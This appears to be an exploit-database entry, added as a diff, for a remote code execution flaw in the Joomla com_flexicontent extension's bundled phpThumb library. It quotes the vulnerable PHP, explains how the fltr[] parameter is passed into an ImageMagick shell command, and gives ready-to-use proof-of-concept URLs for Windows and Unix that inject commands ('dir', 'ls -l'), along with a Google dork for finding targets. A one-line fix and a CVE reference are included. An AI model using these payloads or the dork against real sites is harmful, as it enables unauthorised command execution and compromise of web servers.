@@ -1,0 +1,94 @@
+id: 21637
+date: 12/08/2013
+title: Joomla Flexicontent Remote Code Execution Vulnerability
+author: Rafay Baloch
+cves: 
+
+# Exploit Title: Joomla com_flexicontent Remote Code Execution
+# Release Date: 08/12/2013
+# Author: Deepankar Arora And Rafay Baloch
+# Contact: http://rafayhackingarticles.net
+# Vendor: http://www.flexicontent.org/
+# Versions Affected: 2.1.3(Latest) and earlier
+# Google Dork: inurl:com_flexicontent
+
+*----*
+*Description:*
+
+The vulnerability with phpthumb with a known vulnerability, however it has
+been included with com_flexicontent package.
+
+The exploit is nested in the "SafeExec" function, but the vulnerable
+parameter is passed to "ImageMagickThumbnailToGD".
+
+The vulnerable code is as follows:
+
+foreach ($this->fltr as $filterkey => $filtercommand) {
+@list($command, $parameter) = explode('|', $filtercommand, 2);
+switch ($command) {
+case 'blur':
+        if ($this->ImageMagickSwitchAvailable('blur')) {
+             @list($radius) = explode('|', $parameter);
+              $radius = ($radius ? $radius : 1);
+              $commandline .= ' -blur '.$radius;
+              unset($this->fltr[$filterkey]);
+         }
+        break;
+
+$this->DebugMessage('ImageMagick called as ('.$commandline.')', __FILE__,
+__LINE__);
+ $IMresult = phpthumb_functions::SafeExec($commandline);
+ clearstatcache();
+ if (@$IMtempSourceFilename && file_exists($IMtempSourceFilename)) {
+      @unlink($IMtempSourceFilename);
+ }
+
+ if (!@file_exists($IMtempfilename) || !@filesize($IMtempfilename)) {
+      $this->FatalError('ImageMagick failed with message
+('.trim($IMresult).')');
+      $this->DebugMessage('ImageMagick failed with message
+('.trim($IMresult).')', __FILE__, __LINE__);
+
+
+Here the vulnerable parameter is fltr[] as the params passed is exploded by
+the pipe (|) character, and that's where the code is passed.
+How the command is processed:
+
+$output = array();
+$lastline = $execfunction($command, $output);
+$returnvalue = implode("\n", $output);
+
+
+As we can see the $command parameter is compiled with the imagemagick path,
+filename and parameters. Even the phpThumbDebug parameter gives us a
+console like account of everything imagemagick does as it executes.
+
+
+*----*
+*POC:*
+
+*Windows-
+/components/com_flexicontent/librairies/phpthumb/phpThumb.php?src=file.jpg&fltr[]=blur|9
+-quality  75 -interlace line fail.jpg jpeg:fail.jpg %26%26 dir  %26%26
+&phpThumbDebug=9
+
+*nix-
+/components/com_flexicontent/librairies/phpthumb/phpThumb.php?src=file.jpg&fltr[]=blur|9
+-quality  75 -interlace line fail.jpg jpeg:fail.jpg ; ls -l ;
+&phpThumbDebug=9
+
+*----*
+*Fix:*
+
+Replace the phpthumb package being used with the latest version.
+
+*----*
+*References:*
+http://www.cvedetails.com/cve/CVE-2010-1598/
+
+*----*
+Warm Regards,
+Deepankar Arora and Rafay Baloch
+RHA Infosec
+
+#  0day.today [2023-03-22]  #
